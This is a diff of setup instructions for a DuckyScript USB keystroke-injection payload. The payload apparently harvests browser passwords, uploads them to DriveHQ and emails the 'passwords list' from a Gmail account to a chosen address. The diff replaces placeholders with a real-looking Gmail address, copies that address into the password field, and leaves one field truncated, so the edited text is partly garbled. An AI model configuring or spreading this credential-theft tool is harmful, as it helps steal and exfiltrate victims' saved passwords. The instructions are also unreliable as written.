@@ -66,15 +66,15 @@ ENTER
 
     On line 25 ```STRING YourDriveHQPassword``` change ___YourDriveHQPassword___ to your password for www.drivehq.com
 
-    On line 51 ```$emailSmtpUser = "yourgmailusername@gmail.com";``` This the account email used to send the email with 
-        the passwords list. It is only set to use a gmail address. Change ___yourgmailusername@gmail.com___ to your email. 
+    On line 51 ```$emailSmtpUser = "alibefree884@gmail.com";``` This the account email used to send the email with 
+        the passwords list. It is only set to use a gmail address. Change ___alibefree884@gmail.com___ to your email. 
         Leave the quotation marks on both sides there.
 
-    On line 51 ```$emailSmtpPass = "YourGmailPassword";``` change ___YourGmailPassword___ to the password for your account 
+    On line 51 ```$emailSmtpPass = "alibefree884@gmail.com";``` change ___alibefree884@gmail.com___ to the password for your account 
         but leave the quotation marks on both sides there.
 
     On line 51 ```$emailMessage.From = "DuckyScript Browser Passwords <YourEmailAddressHere@gmail.com>";``` change 
-        ___YourEmailAddressHere@gmail.com___ to your email address. Please leave the brackets on either side of the email 
+        ___alibe ___ to your email address. Please leave the brackets on either side of the email 
         address.
     On line 51 ```$emailMessage.To.Add("EmailToSendTo@example.com");``` change ___EmailToSendTo@example.com___ to whatever 
         email you are sending the files to. Leave the quotation marks on both sides there.
